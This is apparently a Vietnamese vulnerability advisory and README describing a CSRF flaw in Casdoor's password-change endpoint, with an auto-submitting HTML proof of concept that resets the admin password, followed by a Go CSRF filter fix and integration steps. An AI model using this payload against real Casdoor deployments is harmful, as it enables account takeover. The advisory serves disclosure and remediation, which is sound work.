---
title: Casdoor – Cross-Site Request Forgery (CSRF)
date: 25/02/2025
header:
  teaser: https://casdoor.org/assets/images/step4_result2-5f31450f52b9f797c8f1afcf2fd19914.png
---

# Casdoor – Cross-Site Request Forgery (CSRF)

Tóm tắt
- Lỗ hổng: CSRF trong `/api/set-password` cho phép thay đổi mật khẩu mà không cần sự đồng ý.

- Phiên bản bị ảnh hưởng: Tất cả các version đều bị ảnh hưởng. Hiện chưa có bản vá lỗi nào.

- CVE: CVE-2023-34927 (mã CVE mới nhất chưa được gán).

- Tác giả khai thác: Van Lam Nguyen.

- Đã thử nghiệm trên: Windows

Tác động
- Nếu nạn nhân đã đăng nhập vào Casdoor, một yêu cầu POST (ví dụ: `built-in/admin`) có thể thay đổi mật khẩu của nạn nhân, dẫn đến việc chiếm đoạt tài khoản.

Điều kiện tấn công
- Nạn nhân đã được xác thực và có cookie `casdoor_session_id` hợp lệ.

- Nạn nhân truy cập vào một trang độc hại tự động gửi yêu cầu POST đến `/api/set-password`.

Proof of Concept
```html
<html>
<form action="http://localhost:8000/api/set-password" method="POST">
    <input name='userOwner' value='built&#45;in' type='hidden'>
    <input name='userName' value='admin' type='hidden'>
    <input name='newPassword' value='hacked' type='hidden'>
    <input type=submit>
</form>
<script>
    history.pushState('', '', '/');
    document.forms[0].submit();
</script>
</html>
```

Nguyên nhân gốc rễ
- Các điểm cuối thay đổi trạng thái trong `/api/*` chấp nhận các yêu cầu được xác thực bằng cookie mà không thực thi kiểm tra cùng nguồn gốc (`Origin`/`Referer`) hoặc mã thông báo CSRF.

Tổng quan về cách khắc phục
- Thêm bộ lọc CSRF phía máy chủ để từ chối các yêu cầu POST/PUT/DELETE/PATCH dựa trên cookie giữa các trang web khác nhau trong `/api/*`.

- Cho phép các yêu cầu mang theo xác thực không phải cookie rõ ràng (ví dụ: `Authorization`, xác thực cơ bản, thông tin đăng nhập của máy khách hoặc `accessToken`) hoặc các yêu cầu không có cookie phiên trình duyệt (các cuộc gọi máy chủ-máy chủ thông thường).

Cách triển khai
- Sử dụng `routers.CSRFFilter` được triển khai trong `csrf_filter.go`. Bộ lọc này:

- Trả về sớm cho các phương thức không thay đổi trạng thái.

- Cho phép các yêu cầu có xác thực không phải cookie rõ ràng.

- Chặn các yêu cầu giữa các trang web khác nhau khi có cookie phiên và nguồn gốc không khớp với máy chủ.

Cách tích hợp vào Casdoor
1. Sao chép tệp `csrf_filter.go` vào thư mục `routers` hiện có của dự án Casdoor. Không được sửa đổi hoặc xóa bất cứ thứ gì trong tệp này.
2. Đăng ký bộ lọc ở đầu chuỗi xử lý HTTP (bên trong hàm `main`):
   ```go
   // Beego v1 style
   beego.InsertFilter("/api/*", beego.BeforeRouter, routers.CSRFFilter)
   
   // If your project uses Beego v2 and imports as `web`:
   // web.InsertFilter("/api/*", web.BeforeRouter, routers.CSRFFilter)
   ```

Xác minh
- Sau khi đăng ký bộ lọc, hãy chạy lại PoC ở trên khi đã đăng nhập. Yêu cầu sẽ bị từ chối với thông báo `Thao tác không được ủy quyền` và máy chủ sẽ ghi lại `Kiểm tra CSRF không thành công`.

- Các cuộc gọi API đa nguồn gốc bao gồm tiêu đề `Authorization` hoặc tham số `accessToken` sẽ tiếp tục hoạt động.

Tệp tin trong kho lưu trữ
- `csrf_filter.go`: Bộ lọc CSRF để sao chép vào gói `routers` của Casdoor.

- `poc.html`: Trang tối thiểu mô phỏng cuộc tấn công CSRF.

- `README.md`: Tài liệu này mô tả lỗ hổng và các bước khắc phục.

Tài liệu tham khảo
- Casdoor: https://casdoor.org/
- Phiên bản: https://github.com/casdoor/casdoor/releases
- https://vulmon.com/vulnerabilitydetails?qid=CVE-2023-34927

Video
- Youtube: https://youtu.be/N5VENgiObjY
